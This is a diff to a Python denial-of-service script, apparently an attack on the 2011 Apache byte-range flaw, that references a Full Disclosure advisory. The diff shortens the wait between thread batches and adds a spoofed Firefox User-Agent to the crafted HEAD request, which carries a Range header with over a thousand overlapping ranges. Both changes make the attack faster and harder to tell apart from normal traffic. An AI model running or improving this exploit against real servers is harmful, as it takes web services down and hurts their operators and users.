@@ -9,7 +9,7 @@ LICENSE     = "Public domain (FREE)"
 SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts"
 REFERENCE   = "http://seclists.org/fulldisclosure/2011/Aug/175"
 
-SLEEP_TIME = 5          # time to wait for new thread slots (after max number reached)
+SLEEP_TIME = 3          # time to wait for new thread slots (after max number reached)
 RECV_SIZE = 100         # receive buffer size in testing mode
 RANGE_NUMBER = 1024     # number of range subitems forming the DoS payload
 
@@ -26,7 +26,7 @@ def attack(target):
 
     def _send(recv=False):
         payload = ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
-        packet = "HEAD %s HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (page, target, payload)
+        packet = "HEAD %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (page, target, payload)
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, int(port)))
